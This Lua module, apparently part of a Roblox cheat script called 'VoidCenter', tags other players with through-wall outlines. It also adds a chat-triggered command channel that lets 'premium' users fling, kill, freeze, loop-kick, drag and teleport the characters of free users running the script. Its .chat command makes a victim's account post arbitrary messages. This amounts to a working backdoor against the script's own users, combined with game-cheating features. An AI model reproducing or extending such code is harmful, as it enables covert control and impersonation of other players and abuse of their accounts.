-- ── VoidCenter: Detection + P2P module ─────────────────────
local _VC = getgenv()._VC
local LP             = _VC.LP
local Players        = _VC.Players
local RunService     = _VC.RunService
local Debris         = _VC.Debris
local C              = _VC.C
local N              = _VC.N
local Config         = _VC.Config
local IsPremium      = _VC.IsPremium
local premIds        = _VC.premIds
local Notify         = _VC.Notify
local FindPlayer     = _VC.FindPlayer
local PStr           = _VC.PStr
local Reg            = _VC.Reg
local RefreshActive  = _VC.RefreshActive
local Screen         = _VC.Screen
local UserInputService = _VC.UserInputService

-- VOID USER DETECTION  (whitelist-based, no cross-client needed)
-- ─────────────────────────────────────────────────────────
-- Since every script loads the same two GitHub lists, we
-- already know exactly who has the script and what tier
-- they are. We just scan the player list on load and watch
-- PlayerAdded for new joiners. No chat, no parts, nothing.
--
-- P2P SIGNALS still use invisible chat (confirmed working)
-- for premium commands. Detection itself needs nothing.
-- ═══════════════════════════════════════════════════════════

local vcUsers = {}   -- [player] = { premium = bool }

local function IsVoidUser(p) return vcUsers[p] ~= nil end

local function IsWhitelisted(player)
    -- Everyone running the script is considered a VC user.
    -- Premium check is separate (premIds only).
    return vcUsers[player] ~= nil
end

-- ── Tags ──────────────────────────────────────────────────────
local tagData = {}

local function RemoveTag(p)
    if tagData[p] then pcall(function() tagData[p]:Destroy() end) tagData[p] = nil end
end

local function MakeTag(player)
    if player == LP then return end
    local ch   = player.Character
    if not ch then return end
    RemoveTag(player)

    local info = vcUsers[player]
    local prem = info and info.premium == true

    -- Use a Highlight — works at any distance, through walls, no culling
    local hl = Instance.new("Highlight")
    hl.Name                = "VTag_"..player.Name
    hl.FillTransparency    = 1          -- no fill, outline only so it doesn't clash with ESP
    hl.OutlineTransparency = 0
    hl.OutlineColor        = prem and C.Gold or C.AcctBr
    hl.Adornee             = ch
    hl.Parent              = ch

    tagData[player] = hl
end

-- Register a player as a VC user based on whitelist tier
local function RegisterIfWhitelisted(player)
    -- Name kept for compatibility but now registers ALL players — free tier is open.
    -- Premium is determined solely by premIds.
    if player == LP then return end
    local isPrem = premIds[player.UserId] == true

    local prev = vcUsers[player]
    vcUsers[player] = { premium = isPrem }

    if not prev or prev.premium ~= isPrem
    or not tagData[player] or not tagData[player].Parent then
        if player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
            MakeTag(player)
        end
    end
    -- Rebuild tag when they respawn
    if not prev then
        player.CharacterAdded:Connect(function()
            task.wait(1)
            if vcUsers[player] then MakeTag(player) end
        end)
    end
end

-- Scan everyone already in the server
for _, p in ipairs(Players:GetPlayers()) do
    RegisterIfWhitelisted(p)
end

-- Watch for new players joining
Players.PlayerAdded:Connect(function(p)
    -- Wait briefly for their character to load
    task.delay(1, function() RegisterIfWhitelisted(p) end)
end)

Players.PlayerRemoving:Connect(function(p)
    RemoveTag(p)
    vcUsers[p] = nil
end)

-- Rebuild tags after we respawn
LP.CharacterAdded:Connect(function()
    task.wait(1)
    for p in pairs(vcUsers) do
        if p.Character and p.Character:FindFirstChild("HumanoidRootPart") then
            MakeTag(p)
        end
    end
end)

-- ═══════════════════════════════════════════════════════════
-- P2P SIGNALS  (dot-commands in chat)
-- ─────────────────────────────────────────────────────────
-- Premium users type .fling Player1 etc. in Roblox chat.
-- The target's script watches all whitelisted premium players'
-- chat and executes the command locally on itself.
-- Only premium UserIds can send, only free UserIds are targets.
-- ═══════════════════════════════════════════════════════════

-- Dot-command prefix
local DOT = "."

-- Dummy SendSig so commands module doesn't error — not used anymore
local function SendSig() end

-- ── Execute a dot-command on ourselves ────────────────────────
local function HandleDotCmd(sender, cmd, targetName, extra)
    -- Sender must be premium
    if not premIds[sender.UserId] then return end
    -- We must be free (premium can't be targeted)
    if IsPremium() then return end
    -- Command must be targeting us (by name or display name)
    if targetName then
        local tn   = targetName:lower()
        local name = LP.Name:lower()
        local disp = LP.DisplayName:lower()
        -- exact username, exact displayname, partial username, partial displayname
        local match = (name == tn)
                   or (disp == tn)
                   or (name:find(tn, 1, true) ~= nil)
                   or (disp:find(tn, 1, true) ~= nil)
        if not match then return end
    end

    local c, r, hum
    local function gc()
        c   = LP.Character
        r   = c and c:FindFirstChild("HumanoidRootPart")
        hum = c and c:FindFirstChildOfClass("Humanoid")
    end

    if cmd == "fling" then
        gc() if not r then return end
        local bv = Instance.new("BodyVelocity")
        bv.MaxForce = Vector3.new(1e9,1e9,1e9)
        bv.Velocity = Vector3.new(math.random(-160,160),350,math.random(-160,160))
        bv.Parent = r
        Debris:AddItem(bv, 0.15)
        Notify("Signal","Flung by "..sender.DisplayName,"warning",3)

    elseif cmd == "bring" then
        gc()
        local sr = sender.Character and sender.Character:FindFirstChild("HumanoidRootPart")
        if r and sr then
            r.CFrame = sr.CFrame * CFrame.new(math.random(-4,4),0,math.random(-4,4))
        end
        Notify("Signal","Brought to "..sender.DisplayName,"info",3)

    elseif cmd == "bringall" then
        -- No target needed — affects all free users
        gc()
        local sr = sender.Character and sender.Character:FindFirstChild("HumanoidRootPart")
        if r and sr then
            r.CFrame = sr.CFrame * CFrame.new(math.random(-8,8),0,math.random(-8,8))
        end
        Notify("Signal","Brought (all) to "..sender.DisplayName,"info",3)

    elseif cmd == "kill" or cmd == "reset" then
        gc() if hum then hum.Health = 0 end
        Notify("Signal","Killed by "..sender.DisplayName,"error",3)

    elseif cmd == "freeze" then
        Config.ActiveCmds["Frozen"] = true RefreshActive() gc()
        if c then
            for _,p in ipairs(c:GetDescendants()) do
                if p:IsA("BasePart") then p.Anchored = true end
            end
            if hum then hum.PlatformStand = true end
        end
        Notify("Signal","Frozen by "..sender.DisplayName,"warning",4)

    elseif cmd == "unfreeze" then
        Config.ActiveCmds["Frozen"] = nil RefreshActive() gc()
        if c then
            for _,p in ipairs(c:GetDescendants()) do
                if p:IsA("BasePart") then p.Anchored = false end
            end
            if hum then hum.PlatformStand = false end
        end
        Notify("Signal","Unfrozen by "..sender.DisplayName,"info",3)

    elseif cmd == "kick" then
        if Config.ActiveCmds["Kicked"] then return end
        Config.ActiveCmds["Kicked"] = true RefreshActive()
        Notify("Signal","Kicked by "..sender.DisplayName,"error",4)
        task.spawn(function()
            while Config.ActiveCmds["Kicked"] do
                pcall(function()
                    gc()
                    if r   then r.CFrame   = CFrame.new(0,-9999,0) end
                    if hum then hum.Health = 0 end
                end)
                task.wait(0.08)
            end
        end)

    elseif cmd == "unkick" then
        Config.ActiveCmds["Kicked"] = nil RefreshActive()
        Notify("Signal","Kick stopped","info",3)

    elseif cmd == "control" or cmd == "ctrl" then
        if IsPremium() then return end
        Config.ActiveCmds["Controlled"] = true RefreshActive() gc()
        if c then
            for _,p in ipairs(c:GetDescendants()) do
                if p:IsA("BasePart") then p.Anchored = true end
            end
            if hum then hum.PlatformStand = true end
        end
        Notify("Signal","Controlled by "..sender.DisplayName,"warning",5)

    elseif cmd == "release" then
        Config.ActiveCmds["Controlled"] = nil RefreshActive() gc()
        if c then
            for _,p in ipairs(c:GetDescendants()) do
                if p:IsA("BasePart") then p.Anchored = false end
            end
            if hum then hum.PlatformStand = false end
            if r then
                local bv = r:FindFirstChild("VoidCtrlBV")
                if bv then bv:Destroy() end
            end
        end
        Notify("Signal","Control released","info",3)

    elseif cmd == "chat" then
        if not extra or extra == "" then return end
        local sent = false
        if not sent then pcall(function()
            local tcs = game:GetService("TextChatService")
            if tcs.ChatVersion == Enum.ChatVersion.TextChatService then
                local ch = tcs.TextChannels:FindFirstChild("RBXGeneral")
                if ch then ch:SendAsync(extra) sent = true end
            end
        end) end
        if not sent then pcall(function()
            local ev  = game:GetService("ReplicatedStorage"):FindFirstChild("DefaultChatSystemChatEvents")
            local sr2 = ev and ev:FindFirstChild("SayMessageRequest")
            if sr2 then sr2:FireServer(extra, "All") end
        end) end

    elseif cmd == "spin" then
        gc() if not r then return end
        local bav = Instance.new("BodyAngularVelocity")
        bav.MaxTorque = Vector3.new(0, 9e9, 0)
        bav.AngularVelocity = Vector3.new(0, 80, 0)
        bav.Parent = r
        Debris:AddItem(bav, 3)
        Notify("Signal", "Spun by "..sender.DisplayName, "warning", 3)

    elseif cmd == "explode" then
        gc() if not r then return end
        local dirs = {
            Vector3.new(1,1,0), Vector3.new(-1,1,0),
            Vector3.new(0,1,1), Vector3.new(0,1,-1),
            Vector3.new(1,1,1), Vector3.new(-1,1,-1),
        }
        for _, dir in ipairs(dirs) do
            local bv = Instance.new("BodyVelocity")
            bv.MaxForce = Vector3.new(1e9,1e9,1e9)
            bv.Velocity = dir.Unit * 120
            bv.Parent = r
            Debris:AddItem(bv, 0.12)
        end
        Notify("Signal", "Exploded by "..sender.DisplayName, "error", 3)

    elseif cmd == "follow" then
        -- Start a loop that walks us toward the sender every 0.1s
        if Config.ActiveCmds["Followed"] then return end
        Config.ActiveCmds["Followed"] = true
        RefreshActive()
        Notify("Signal", "Forced to follow "..sender.DisplayName, "warning", 4)
        task.spawn(function()
            while Config.ActiveCmds["Followed"] do
                pcall(function()
                    gc()
                    local sr = sender.Character and sender.Character:FindFirstChild("HumanoidRootPart")
                    if hum and sr and r then
                        hum:MoveTo(sr.Position)
                    end
                end)
                task.wait(0.1)
            end
        end)

    elseif cmd == "unfollow" then
        Config.ActiveCmds["Followed"] = nil
        RefreshActive()
        Notify("Signal", "Follow stopped", "info", 3)

    elseif cmd == "tp2me" then
        -- Teleport us to sender on a loop
        if Config.ActiveCmds["TP2Me"] then return end
        Config.ActiveCmds["TP2Me"] = true
        RefreshActive()
        Notify("Signal", "TP'd to "..sender.DisplayName, "warning", 4)
        task.spawn(function()
            while Config.ActiveCmds["TP2Me"] do
                pcall(function()
                    gc()
                    local sr = sender.Character and sender.Character:FindFirstChild("HumanoidRootPart")
                    if r and sr then
                        r.CFrame = sr.CFrame * CFrame.new(math.random(-3,3), 0, math.random(-3,3))
                    end
                end)
                task.wait(0.5)
            end
        end)

    elseif cmd == "untp2me" then
        Config.ActiveCmds["TP2Me"] = nil
        RefreshActive()
        Notify("Signal", "TP loop stopped", "info", 3)
    end
end

-- ── Parse a chat message for dot-commands ─────────────────────
local function OnChat(speaker, msg)
    if not msg or msg == "" then return end
    if not premIds[speaker.UserId] then return end  -- only premium senders

    -- Strip any "Name: " prefix that some chat systems prepend
    local clean = msg:match("^%S+:%s*(.+)$") or msg
    -- Must start with dot
    if clean:sub(1,1) ~= DOT then return end

    -- Split everything after the dot
    local body  = clean:sub(2):match("^%s*(.-)%s*$")  -- trim
    local parts = {}
    for w in body:gmatch("%S+") do table.insert(parts, w) end
    if #parts == 0 then return end

    local cmd        = parts[1]:lower()
    -- targetName is everything from part 2 up to but not including extra words
    -- For .chat the extra is words 3+, for everything else words 2 is target and 3+ is extra
    local targetName = parts[2] or nil
    local extra      = #parts >= 3 and table.concat(parts, " ", 3) or ""

    -- bringall has no target
    if cmd == "bringall" then
        HandleDotCmd(speaker, cmd, nil, "")
        return
    end

    if cmd ~= "" then
        HandleDotCmd(speaker, cmd, targetName, extra)
    end
end

-- ── Hook chat for all whitelisted premium players ──────────────
local function WatchPlayer(player)
    if not premIds[player.UserId] then return end  -- only watch premium players
    player.Chatted:Connect(function(msg)
        task.spawn(OnChat, player, msg)
    end)
end

for _, p in ipairs(Players:GetPlayers()) do
    if p ~= LP then WatchPlayer(p) end
end
Players.PlayerAdded:Connect(function(p)
    if p ~= LP then WatchPlayer(p) end
end)

-- Also hook TextChatService MessageReceived for new chat system
pcall(function()
    local tcs = game:GetService("TextChatService")
    if tcs.ChatVersion == Enum.ChatVersion.TextChatService then
        tcs.MessageReceived:Connect(function(msg)
            local src = msg and msg.TextSource
            if not src then return end
            local p = Players:GetPlayerByUserId(src.UserId)
            if not p or p == LP then return end
            local raw = (msg.OriginalText ~= "") and msg.OriginalText or msg.Text
            task.spawn(OnChat, p, raw)
        end)
    end
end)


-- =========================================================
-- Export detection state for commands module
_VC.vcUsers         = vcUsers
_VC.IsVoidUser      = IsVoidUser
_VC.IsWhitelisted   = IsWhitelisted
_VC.SendSig         = SendSig
_VC.tagData         = tagData
